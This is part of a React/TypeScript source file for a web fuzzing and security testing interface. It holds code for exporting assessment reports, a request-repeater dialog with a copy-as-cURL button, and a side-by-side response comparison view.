                    }),
                  ],
                  heading: HeadingLevel.TITLE,
                  alignment: AlignmentType.CENTER,
                  spacing: { after: 200 },
                }),
                new Paragraph({
                  children: [
                    new TextRun({
                      text: "VRAgent Smart Detection",
                      italics: true,
                      size: 24,
                      color: "6B7280",
                    }),
                  ],
                  alignment: AlignmentType.CENTER,
                  spacing: { after: 400 },
                })
              );
              
              // Metadata
              children.push(
                new Paragraph({
                  children: [
                    new TextRun({ text: "Target: ", bold: true }),
                    new TextRun({ text: config.targetUrl || "N/A" }),
                    new TextRun({ text: "    |    Date: ", bold: true }),
                    new TextRun({ text: new Date().toLocaleString() }),
                  ],
                  spacing: { after: 100 },
                }),
                new Paragraph({
                  children: [
                    new TextRun({ text: "Responses Analyzed: ", bold: true }),
                    new TextRun({ text: results.length.toString() }),
                    new TextRun({ text: "    |    Risk Level: ", bold: true }),
                    new TextRun({ 
                      text: `${report.summary?.risk_level?.toUpperCase() || "UNKNOWN"} (${report.summary?.risk_score || 0}/100)`,
                      bold: true,
                      color: report.summary?.risk_level === "critical" ? "DC2626" :
                             report.summary?.risk_level === "high" ? "F59E0B" :
                             report.summary?.risk_level === "medium" ? "EAB308" : "10B981",
                    }),
                  ],
                  spacing: { after: 400 },
                })
              );
              
              // Executive Summary
              children.push(
                new Paragraph({
                  children: [new TextRun({ text: "📊 Executive Summary", bold: true, size: 32, color: "059669" })],
                  heading: HeadingLevel.HEADING_1,
                  spacing: { before: 300, after: 200 },
                }),
                new Paragraph({
                  children: [
                    new TextRun({
                      text: `This automated security assessment analyzed ${results.length} HTTP responses from the target endpoint. The analysis utilized 50+ detection signatures to identify potential vulnerabilities including SQL injection, XSS, command injection, path traversal, and more.`,
                    }),
                  ],
                  spacing: { after: 200 },
                }),
                new Paragraph({
                  children: [
                    new TextRun({ text: "• Vulnerabilities Found: ", bold: true }),
                    new TextRun({ text: `${report.summary?.findings_count || 0}` }),
                  ],
                  bullet: { level: 0 },
                }),
                new Paragraph({
                  children: [
                    new TextRun({ text: "• Anomalies Detected: ", bold: true }),
                    new TextRun({ text: `${report.summary?.anomalies_count || 0}` }),
                  ],
                  bullet: { level: 0 },
                }),
                new Paragraph({
                  children: [
                    new TextRun({ text: "• Interesting Responses: ", bold: true }),
                    new TextRun({ text: `${report.summary?.interesting_count || 0}` }),
                  ],
                  bullet: { level: 0 },
                  spacing: { after: 300 },
                })
              );
              
              // Vulnerabilities
              if (report.vulnerabilities?.length > 0) {
                children.push(
                  new Paragraph({
                    children: [new TextRun({ text: "🔴 Vulnerability Findings", bold: true, size: 32, color: "DC2626" })],
                    heading: HeadingLevel.HEADING_1,
                    spacing: { before: 300, after: 200 },
                  })
                );
                
                report.vulnerabilities.forEach((v: any, i: number) => {
                  const sevColor = v.severity === "critical" ? "DC2626" :
                                   v.severity === "high" ? "F59E0B" :
                                   v.severity === "medium" ? "EAB308" : "3B82F6";
                  
                  children.push(
                    new Paragraph({
                      children: [
                        new TextRun({ text: `${i + 1}. ${v.title || v.vuln_type || "Security Issue"}`, bold: true, size: 26 }),
                        new TextRun({ text: `  [${v.severity?.toUpperCase() || "UNKNOWN"}]`, bold: true, color: sevColor }),
                      ],
                      heading: HeadingLevel.HEADING_2,
                      spacing: { before: 200, after: 100 },
                    })
                  );
                  
                  if (v.description) {
                    children.push(
                      new Paragraph({
                        children: [
                          new TextRun({ text: "Description: ", bold: true }),
                          new TextRun({ text: v.description }),
                        ],
                        spacing: { after: 100 },
                      })
                    );
                  }
                  
                  if (v.payload) {
                    children.push(
                      new Paragraph({
                        children: [
                          new TextRun({ text: "Triggering Payload: ", bold: true }),
                          new TextRun({ text: v.payload, font: "Courier New" }),
                        ],
                        spacing: { after: 100 },
                      })
                    );
                  }
                  
                  if (v.evidence?.length > 0) {
                    children.push(
                      new Paragraph({
                        children: [new TextRun({ text: "Evidence:", bold: true })],
                        spacing: { after: 50 },
                      })
                    );
                    v.evidence.forEach((e: string) => {
                      children.push(
                        new Paragraph({
                          children: [new TextRun({ text: `• ${e}`, font: "Courier New", size: 20 })],
                          indent: { left: 400 },
                        })
                      );
                    });
                  }
                  
                  if (v.recommendation) {
                    children.push(
                      new Paragraph({
                        children: [
                          new TextRun({ text: "💡 Recommendation: ", bold: true, color: "059669" }),
                          new TextRun({ text: v.recommendation }),
                        ],
                        spacing: { before: 100, after: 200 },
                        shading: { fill: "F0FDF4" },
                      })
                    );
                  }
                });
              }
              
              // Anomalies
              if (report.anomalies?.length > 0) {
                children.push(
                  new Paragraph({
                    children: [new TextRun({ text: "⚠️ Anomaly Analysis", bold: true, size: 32, color: "F59E0B" })],
                    heading: HeadingLevel.HEADING_1,
                    spacing: { before: 300, after: 200 },
                  }),
                  new Paragraph({
                    children: [new TextRun({ text: "The following statistical anomalies were detected:" })],
                    spacing: { after: 200 },
                  })
                );
                
                // Anomaly table
                const tableRows = [
                  new DocxTableRow({
                    children: [
                      new DocxTableCell({ children: [new Paragraph({ children: [new TextRun({ text: "#", bold: true })] })], width: { size: 5, type: WidthType.PERCENTAGE } }),
                      new DocxTableCell({ children: [new Paragraph({ children: [new TextRun({ text: "Type", bold: true })] })], width: { size: 25, type: WidthType.PERCENTAGE } }),
                      new DocxTableCell({ children: [new Paragraph({ children: [new TextRun({ text: "Description", bold: true })] })], width: { size: 50, type: WidthType.PERCENTAGE } }),
                      new DocxTableCell({ children: [new Paragraph({ children: [new TextRun({ text: "Score", bold: true })] })], width: { size: 10, type: WidthType.PERCENTAGE } }),
                      new DocxTableCell({ children: [new Paragraph({ children: [new TextRun({ text: "Deviation", bold: true })] })], width: { size: 10, type: WidthType.PERCENTAGE } }),
                    ],
                    tableHeader: true,
                  }),
                  ...report.anomalies.map((a: any, i: number) =>
                    new DocxTableRow({
                      children: [
                        new DocxTableCell({ children: [new Paragraph({ children: [new TextRun({ text: `${i + 1}` })] })] }),
                        new DocxTableCell({ children: [new Paragraph({ children: [new TextRun({ text: a.anomaly_type || "Unknown" })] })] }),
                        new DocxTableCell({ children: [new Paragraph({ children: [new TextRun({ text: a.description || "N/A" })] })] }),
                        new DocxTableCell({ children: [new Paragraph({ children: [new TextRun({ text: a.score?.toFixed(2) || "N/A" })] })] }),
                        new DocxTableCell({ children: [new Paragraph({ children: [new TextRun({ text: `${a.deviation?.toFixed(2) || "N/A"}σ` })] })] }),
                      ],
                    })
                  ),
                ];
                
                children.push(
                  new DocxTable({
                    rows: tableRows,
                    width: { size: 100, type: WidthType.PERCENTAGE },
                  })
                );
              }
              
              // Methodology
              children.push(
                new Paragraph({
                  children: [new TextRun({ text: "📖 Methodology", bold: true, size: 32, color: "6B7280" })],
                  heading: HeadingLevel.HEADING_1,
                  spacing: { before: 400, after: 200 },
                }),
                new Paragraph({
                  children: [new TextRun({ text: "This assessment was performed using VRAgent's Smart Detection engine:" })],
                  spacing: { after: 100 },
                }),
                new Paragraph({
                  children: [new TextRun({ text: "• Pattern-Based Detection: ", bold: true }), new TextRun({ text: "50+ signatures for common vulnerabilities" })],
                  bullet: { level: 0 },
                }),
                new Paragraph({
                  children: [new TextRun({ text: "• Statistical Anomaly Detection: ", bold: true }), new TextRun({ text: "Analysis of response characteristics" })],
                  bullet: { level: 0 },
                }),
                new Paragraph({
                  children: [new TextRun({ text: "• Differential Analysis: ", bold: true }), new TextRun({ text: "Comparison to identify meaningful differences" })],
                  bullet: { level: 0 },
                }),
                new Paragraph({
                  children: [new TextRun({ text: "• Response Categorization: ", bold: true }), new TextRun({ text: "Classification of application behavior" })],
                  bullet: { level: 0 },
                  spacing: { after: 300 },
                })
              );
              
              // Footer note
              children.push(
                new Paragraph({
                  children: [
                    new TextRun({
                      text: "⚠️ Note: Automated security testing may produce false positives. All findings should be manually verified.",
                      italics: true,
                      color: "6B7280",
                    }),
                  ],
                  spacing: { before: 200, after: 200 },
                  shading: { fill: "FEF3C7" },
                }),
                new Paragraph({
                  children: [
                    new TextRun({
                      text: `Report generated by VRAgent Smart Detection on ${new Date().toLocaleString()}`,
                      italics: true,
                      size: 20,
                      color: "9CA3AF",
                    }),
                  ],
                  alignment: AlignmentType.CENTER,
                })
              );
              
              const doc_word = new DocxDocument({
                sections: [{
                  properties: {},
                  children: children,
                }],
              });
              
              const blob = await Packer.toBlob(doc_word);
              saveAs(blob, `security-report-${new Date().toISOString().split("T")[0]}.docx`);
            }}
          >
            Export Word
          </Button>
          
          <Box sx={{ flex: 1 }} />
          
          <Button
            variant="outlined"
            startIcon={<ContentCopyIcon />}
            onClick={() => {
              // Generate plain text version
              const report = smartDetectionResults;
              if (!report) return;
              
              let text = "FUZZING SECURITY ASSESSMENT REPORT\n";
              text += "===================================\n\n";
              text += `Target: ${config.targetUrl || "N/A"}\n`;
              text += `Date: ${new Date().toLocaleString()}\n`;
              text += `Responses Analyzed: ${results.length}\n\n`;
              
              text += "EXECUTIVE SUMMARY\n";
              text += "-----------------\n";
              text += `Risk Score: ${report.summary?.risk_score || 0}/100 (${report.summary?.risk_level?.toUpperCase() || "UNKNOWN"})\n`;
              text += `Vulnerabilities: ${report.summary?.findings_count || 0}\n`;
              text += `Anomalies: ${report.summary?.anomalies_count || 0}\n\n`;
              
              if (report.vulnerabilities?.length > 0) {
                text += "VULNERABILITY FINDINGS\n";
                text += "----------------------\n";
                report.vulnerabilities.forEach((v: any, i: number) => {
                  text += `\n${i + 1}. ${v.title || v.vuln_type || "Security Issue"} [${v.severity?.toUpperCase()}]\n`;
                  if (v.payload) text += `   Payload: ${v.payload}\n`;
                  if (v.evidence?.length) text += `   Evidence: ${v.evidence.join(", ")}\n`;
                  if (v.recommendation) text += `   Recommendation: ${v.recommendation}\n`;
                });
                text += "\n";
              }
              
              if (report.anomalies?.length > 0) {
                text += "ANOMALIES\n";
                text += "---------\n";
                report.anomalies.forEach((a: any, i: number) => {
                  text += `${i + 1}. ${a.anomaly_type}: ${a.description} (Score: ${a.score?.toFixed(2)})\n`;
                });
                text += "\n";
              }
              
              text += "---\nGenerated by VRAgent Smart Detection";
              
              navigator.clipboard.writeText(text);
            }}
          >
            Copy Text
          </Button>
          <Button onClick={() => setShowWrittenReportDialog(false)} variant="contained" color="success">
            Close
          </Button>
        </DialogActions>
      </Dialog>

      {/* Repeater Dialog */}
      <Dialog 
        open={repeaterOpen} 
        onClose={() => setRepeaterOpen(false)} 
        maxWidth="xl" 
        fullWidth
        PaperProps={{ sx: { minHeight: "80vh" } }}
      >
        <DialogTitle sx={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
          <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
            <RefreshIcon color="secondary" />
            <Typography variant="h6">Repeater</Typography>
            {repeaterRequest?.originalPayload && (
              <Chip 
                label={`Original: ${repeaterRequest.originalPayload.slice(0, 30)}${repeaterRequest.originalPayload.length > 30 ? "..." : ""}`}
                size="small"
                variant="outlined"
              />
            )}
          </Box>
          <IconButton onClick={() => setRepeaterOpen(false)}>
            <ExpandMoreIcon />
          </IconButton>
        </DialogTitle>
        <DialogContent dividers>
          {repeaterRequest && (
            <Grid container spacing={2}>
              {/* Request Panel */}
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2, height: "100%" }}>
                  <Typography variant="subtitle1" fontWeight={600} sx={{ mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <SendIcon fontSize="small" color="primary" />
                    Request
                  </Typography>
                  
                  {/* Method & URL */}
                  <Box sx={{ display: "flex", gap: 1, mb: 2 }}>
                    <FormControl size="small" sx={{ minWidth: 100 }}>
                      <Select
                        value={repeaterRequest.method}
                        onChange={(e) => setRepeaterRequest({ ...repeaterRequest, method: e.target.value })}
                      >
                        {["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"].map(m => (
                          <MenuItem key={m} value={m}>{m}</MenuItem>
                        ))}
                      </Select>
                    </FormControl>
                    <TextField
                      size="small"
                      fullWidth
                      value={repeaterRequest.url}
                      onChange={(e) => setRepeaterRequest({ ...repeaterRequest, url: e.target.value })}
                      placeholder="URL"
                      sx={{ fontFamily: "monospace" }}
                    />
                  </Box>
                  
                  {/* Headers */}
                  <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
                    Headers
                  </Typography>
                  <Paper variant="outlined" sx={{ p: 1, mb: 2, maxHeight: 200, overflow: "auto" }}>
                    {Object.entries(repeaterRequest.headers).map(([key, value]) => (
                      <Box key={key} sx={{ display: "flex", gap: 1, mb: 1 }}>
                        <TextField
                          size="small"
                          placeholder="Header name"
                          value={key}
                          onChange={(e) => updateRepeaterHeader(key, e.target.value, value)}
                          sx={{ flex: 1, "& input": { fontFamily: "monospace", fontSize: "0.85rem" } }}
                        />
                        <TextField
                          size="small"
                          placeholder="Value"
                          value={value}
                          onChange={(e) => updateRepeaterHeader(key, key, e.target.value)}
                          sx={{ flex: 2, "& input": { fontFamily: "monospace", fontSize: "0.85rem" } }}
                        />
                        <IconButton size="small" onClick={() => deleteRepeaterHeader(key)} color="error">
                          <DeleteIcon fontSize="small" />
                        </IconButton>
                      </Box>
                    ))}
                    <Button size="small" startIcon={<AddIcon />} onClick={addRepeaterHeader}>
                      Add Header
                    </Button>
                  </Paper>
                  
                  {/* Body */}
                  <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
                    Body
                  </Typography>
                  <TextField
                    fullWidth
                    multiline
                    rows={6}
                    value={repeaterRequest.body}
                    onChange={(e) => setRepeaterRequest({ ...repeaterRequest, body: e.target.value })}
                    placeholder="Request body..."
                    sx={{ "& textarea": { fontFamily: "monospace", fontSize: "0.85rem" } }}
                  />
                  
                  {/* Proxy */}
                  <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1, mt: 2 }}>
                    Proxy (optional)
                  </Typography>
                  <TextField
                    fullWidth
                    size="small"
                    value={repeaterRequest.proxyUrl}
                    onChange={(e) => setRepeaterRequest({ ...repeaterRequest, proxyUrl: e.target.value })}
                    placeholder="http://127.0.0.1:8080 (Burp Suite)"
                    helperText="Route through Burp Suite, ZAP, or mitmproxy"
                    sx={{ "& input": { fontFamily: "monospace", fontSize: "0.85rem" } }}
                  />
                  
                  {/* Send Button */}
                  <Box sx={{ mt: 2 }}>
                    <Button
                      variant="contained"
                      color="primary"
                      size="large"
                      fullWidth
                      startIcon={repeaterSending ? <CircularProgress size={20} color="inherit" /> : <SendIcon />}
                      onClick={sendRepeaterRequest}
                      disabled={repeaterSending}
                    >
                      {repeaterSending ? "Sending..." : "Send"}
                    </Button>
                  </Box>
                </Paper>
              </Grid>
              
              {/* Response Panel */}
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2, height: "100%" }}>
                  <Typography variant="subtitle1" fontWeight={600} sx={{ mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                    <HttpIcon fontSize="small" color="success" />
                    Response
                    {repeaterResponse && (
                      <Chip 
                        label={repeaterResponse.statusCode}
                        size="small"
                        color={repeaterResponse.statusCode < 300 ? "success" : repeaterResponse.statusCode < 400 ? "warning" : "error"}
                      />
                    )}
                  </Typography>
                  
                  {repeaterResponse ? (
                    <>
                      {/* Response Stats */}
                      <Grid container spacing={1} sx={{ mb: 2 }}>
                        <Grid item xs={4}>
                          <Paper sx={{ p: 1, textAlign: "center", bgcolor: alpha("#10b981", 0.1) }}>
                            <Typography variant="caption" color="text.secondary">Status</Typography>
                            <Typography variant="h6" fontWeight={700}>{repeaterResponse.statusCode}</Typography>
                          </Paper>
                        </Grid>
                        <Grid item xs={4}>
                          <Paper sx={{ p: 1, textAlign: "center", bgcolor: alpha("#3b82f6", 0.1) }}>
                            <Typography variant="caption" color="text.secondary">Time</Typography>
                            <Typography variant="h6" fontWeight={700}>{repeaterResponse.responseTime}ms</Typography>
                          </Paper>
                        </Grid>
                        <Grid item xs={4}>
                          <Paper sx={{ p: 1, textAlign: "center", bgcolor: alpha("#8b5cf6", 0.1) }}>
                            <Typography variant="caption" color="text.secondary">Length</Typography>
                            <Typography variant="h6" fontWeight={700}>{repeaterResponse.contentLength}</Typography>
                          </Paper>
                        </Grid>
                      </Grid>
                      
                      {/* Response Headers */}
                      <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
                        Headers
                      </Typography>
                      <Paper variant="outlined" sx={{ p: 1, mb: 2, maxHeight: 150, overflow: "auto", bgcolor: "#f8f9fa" }}>
                        {Object.entries(repeaterResponse.headers).map(([key, value]) => (
                          <Typography key={key} variant="caption" sx={{ display: "block", fontFamily: "monospace" }}>
                            <span style={{ color: "#6366f1" }}>{key}:</span> {value}
                          </Typography>
                        ))}
                      </Paper>
                      
                      {/* Response Body */}
                      <Typography variant="caption" color="text.secondary" sx={{ display: "block", mb: 1 }}>
                        Body
                      </Typography>
                      <Paper 
                        variant="outlined" 
                        sx={{ 
                          p: 1, 
                          bgcolor: "#1e1e1e", 
                          maxHeight: 300, 
                          overflow: "auto",
                        }}
                      >
                        <Typography
                          component="pre"
                          sx={{
                            fontFamily: "monospace",
                            fontSize: "0.8rem",
                            color: "#d4d4d4",
                            whiteSpace: "pre-wrap",
                            wordBreak: "break-all",
                            m: 0,
                          }}
                        >
                          {repeaterResponse.body || "(Empty response)"}
                        </Typography>
                      </Paper>
                    </>
                  ) : (
                    <Box sx={{ textAlign: "center", py: 8, color: "text.disabled" }}>
                      <HttpIcon sx={{ fontSize: 64, mb: 2, opacity: 0.3 }} />
                      <Typography>Send a request to see the response</Typography>
                    </Box>
                  )}
                </Paper>
              </Grid>
              
              {/* History Panel */}
              {repeaterHistory.length > 0 && (
                <Grid item xs={12}>
                  <Paper sx={{ p: 2 }}>
                    <Typography variant="subtitle1" fontWeight={600} sx={{ mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
                      <AccessTimeIcon fontSize="small" />
                      Request History ({repeaterHistory.length})
                    </Typography>
                    <Box sx={{ display: "flex", gap: 1, flexWrap: "wrap" }}>
                      {repeaterHistory.slice(0, 10).map((item) => (
                        <Chip
                          key={item.id}
                          label={`${item.request?.method} → ${item.response?.statusCode}`}
                          size="small"
                          variant={item.response?.statusCode && item.response.statusCode < 300 ? "filled" : "outlined"}
                          color={item.response?.statusCode && item.response.statusCode < 300 ? "success" : item.response?.statusCode && item.response.statusCode < 400 ? "warning" : "error"}
                          onClick={() => {
                            if (item.request) setRepeaterRequest(item.request);
                            if (item.response) setRepeaterResponse(item.response);
                          }}
                          sx={{ cursor: "pointer" }}
                        />
                      ))}
                    </Box>
                  </Paper>
                </Grid>
              )}
            </Grid>
          )}
        </DialogContent>
        <DialogActions>
          <Button
            startIcon={<ContentCopyIcon />}
            onClick={() => {
              if (repeaterRequest) {
                const curlCmd = `curl -X ${repeaterRequest.method} "${repeaterRequest.url}" ${Object.entries(repeaterRequest.headers).map(([k, v]) => `-H "${k}: ${v}"`).join(" ")} ${repeaterRequest.body ? `-d '${repeaterRequest.body}'` : ""}`;
                navigator.clipboard.writeText(curlCmd);
              }
            }}
          >
            Copy as cURL
          </Button>
          <Button onClick={() => setRepeaterOpen(false)} variant="contained">
            Close
          </Button>
        </DialogActions>
      </Dialog>

      {/* Compare Dialog */}
      <Dialog 
        open={compareDialogOpen} 
        onClose={() => setCompareDialogOpen(false)} 
        maxWidth="xl" 
        fullWidth
        PaperProps={{ sx: { minHeight: "70vh" } }}
      >
        <DialogTitle sx={{ display: "flex", alignItems: "center", gap: 1 }}>
          <SearchIcon color="primary" />
          Response Comparison
        </DialogTitle>
        <DialogContent dividers>
          {compareResults[0] && compareResults[1] && (
            <Grid container spacing={2}>
              {/* Summary Comparison */}
              <Grid item xs={12}>
                <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05) }}>
                  <Typography variant="subtitle2" fontWeight={600} sx={{ mb: 2 }}>Quick Comparison</Typography>
                  <Table size="small">
                    <TableHead>
                      <TableRow>
                        <TableCell>Metric</TableCell>
                        <TableCell align="center">Response A</TableCell>
                        <TableCell align="center">Response B</TableCell>
                        <TableCell align="center">Diff</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      <TableRow>
                        <TableCell>Payload</TableCell>
                        <TableCell align="center" sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>{compareResults[0].payload.slice(0, 30)}</TableCell>
                        <TableCell align="center" sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>{compareResults[1].payload.slice(0, 30)}</TableCell>
                        <TableCell align="center">
                          {compareResults[0].payload === compareResults[1].payload 
                            ? <Chip label="Same" size="small" color="default" /> 
                            : <Chip label="Different" size="small" color="info" />
                          }
                        </TableCell>
                      </TableRow>
                      <TableRow>
                        <TableCell>Status Code</TableCell>
                        <TableCell align="center">
                          <Chip label={compareResults[0].statusCode} size="small" color={compareResults[0].statusCode < 300 ? "success" : "error"} />
                        </TableCell>
                        <TableCell align="center">
                          <Chip label={compareResults[1].statusCode} size="small" color={compareResults[1].statusCode < 300 ? "success" : "error"} />
                        </TableCell>
                        <TableCell align="center">
                          {compareResults[0].statusCode === compareResults[1].statusCode 
                            ? <Chip label="Same" size="small" color="success" /> 
                            : <Chip label={`Δ ${compareResults[1].statusCode - compareResults[0].statusCode}`} size="small" color="warning" />
                          }
                        </TableCell>
                      </TableRow>
                      <TableRow>
                        <TableCell>Response Length</TableCell>
                        <TableCell align="center">{compareResults[0].responseLength} bytes</TableCell>
                        <TableCell align="center">{compareResults[1].responseLength} bytes</TableCell>
                        <TableCell align="center">
                          {compareResults[0].responseLength === compareResults[1].responseLength 
                            ? <Chip label="Same" size="small" color="success" /> 
                            : <Chip 
                                label={`Δ ${compareResults[1].responseLength - compareResults[0].responseLength}`} 
                                size="small" 
                                color={Math.abs(compareResults[1].responseLength - compareResults[0].responseLength) > 100 ? "warning" : "default"} 
                              />
                          }
                        </TableCell>
                      </TableRow>
                      <TableRow>
                        <TableCell>Response Time</TableCell>
                        <TableCell align="center">{compareResults[0].responseTime}ms</TableCell>
                        <TableCell align="center">{compareResults[1].responseTime}ms</TableCell>
                        <TableCell align="center">
                          {compareResults[0].responseTime === compareResults[1].responseTime 
                            ? <Chip label="Same" size="small" color="success" /> 
                            : <Chip 
                                label={`Δ ${compareResults[1].responseTime - compareResults[0].responseTime}ms`} 
                                size="small" 
                                color={Math.abs(compareResults[1].responseTime - compareResults[0].responseTime) > 500 ? "warning" : "default"} 
                              />
                          }
                        </TableCell>
                      </TableRow>
                    </TableBody>
                  </Table>
                </Paper>
              </Grid>
              
              {/* Side-by-side Bodies */}
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="subtitle2" fontWeight={600} sx={{ mb: 1 }}>
                    Response A - {compareResults[0].payload.slice(0, 20)}...
                  </Typography>
                  <Paper 
                    variant="outlined" 
                    sx={{ 
                      p: 1, 
                      bgcolor: "#1e1e1e", 
                      maxHeight: 400, 
                      overflow: "auto",
                    }}
                  >
                    <Typography
                      component="pre"
                      sx={{
                        fontFamily: "monospace",
                        fontSize: "0.75rem",
                        color: "#d4d4d4",
                        whiteSpace: "pre-wrap",
                        wordBreak: "break-all",
                        m: 0,
                      }}
                    >
                      {compareResults[0].body || "(No body)"}
                    </Typography>
                  </Paper>
                </Paper>
              </Grid>
              <Grid item xs={12} md={6}>
                <Paper sx={{ p: 2 }}>
                  <Typography variant="subtitle2" fontWeight={600} sx={{ mb: 1 }}>
                    Response B - {compareResults[1].payload.slice(0, 20)}...
                  </Typography>
                  <Paper 
                    variant="outlined" 
                    sx={{ 
                      p: 1, 
                      bgcolor: "#1e1e1e", 
                      maxHeight: 400, 
                      overflow: "auto",
                    }}
                  >
                    <Typography
                      component="pre"
                      sx={{
                        fontFamily: "monospace",
                        fontSize: "0.75rem",
                        color: "#d4d4d4",
                        whiteSpace: "pre-wrap",
                        wordBreak: "break-all",
                        m: 0,
                      }}
                    >
                      {compareResults[1].body || "(No body)"}
                    </Typography>
                  </Paper>
                </Paper>
              </Grid>
            </Grid>
          )}
        </DialogContent>
        <DialogActions>
          <Button 
            onClick={() => {
              setCompareResults([null, null]);
              setCompareDialogOpen(false);
            }}
          >
            Clear Selection
          </Button>
          <Button onClick={() => setCompareDialogOpen(false)} variant="contained">
            Close
          </Button>
        </DialogActions>
      </Dialog>
    </Box>
  );
};

export default FuzzingPage;
